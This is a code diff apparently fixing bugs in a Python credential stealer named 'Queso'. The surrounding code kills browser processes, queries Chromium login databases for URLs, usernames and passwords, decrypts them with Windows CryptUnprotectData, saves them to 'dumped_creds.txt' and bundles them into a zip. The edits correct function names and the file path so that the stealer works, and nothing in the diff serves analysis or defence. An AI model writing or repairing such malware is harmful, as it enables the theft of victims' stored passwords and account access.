@@ -35,7 +35,7 @@ class _o_Syscalls:
         _o_pDataIn = _o_DATA_BLOB(len(_o_EncryptedData), ctypes.cast(_o_EncryptedData, ctypes.POINTER(ctypes.c_ubyte)))
         _o_pDataOut = _o_DATA_BLOB()
         
-        if ctypes.windll.Crypt32._o_CryptUnprotectData(ctypes.byref(_o_pDataIn), None, None, None, None, 0, ctypes.byref(_o_pDataOut)):
+        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(_o_pDataIn), None, None, None, None, 0, ctypes.byref(_o_pDataOut)):
             _o_DataOut = (ctypes.c_ubyte * _o_pDataOut.cbData)()
             ctypes.memmove(_o_DataOut, _o_pDataOut.pbData, _o_pDataOut.cbData)
             ctypes.windll.Kernel32.LocalFree(_o_pDataOut.pbData)
@@ -320,7 +320,7 @@ class _o_Browsers:
 
                 try:
                     # Get the credentials
-                    _o_Results = _o_DBCursor._o_Execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()
+                    _o_Results = _o_DBCursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()
 
                     # Decrypt the passwords and add to the password list
                     for _o_URL, _o_User, _o_Password in _o_Results:
@@ -417,7 +417,7 @@ class Queso:
                     try:
                         _o_Utility._o_KillTask(_o_ProcName)
                         _o_BrowserInstance = _o_Browsers._o_Chromium(_o_dPath)
-                        _o_PasswordFilePath = os.path.join(sys._MEIPASS, "dumped_creds.txt")
+                        _o_PasswordFilePath = os.path.join(os.getcwd(), "dumped_creds.txt")
 
                         _o_BrowserPasswords = _o_BrowserInstance._o_GetCreds()
 
@@ -524,7 +524,7 @@ class Queso:
         
         if "%steal_credentials%":
             self._o_StealBrowserCreds()
-            _o_PasswordFilePath = os.path.join(sys._MEIPASS, "dumped_creds.txt")
+            _o_PasswordFilePath = os.path.join(os.getcwd(), "dumped_creds.txt")
             if os.path.exists(_o_PasswordFilePath):
                 with open(_o_PasswordFilePath, "r") as _o_PasswordFile:
                     _o_ZipData['txt']['dumped_creds'] = _o_PasswordFile.read()
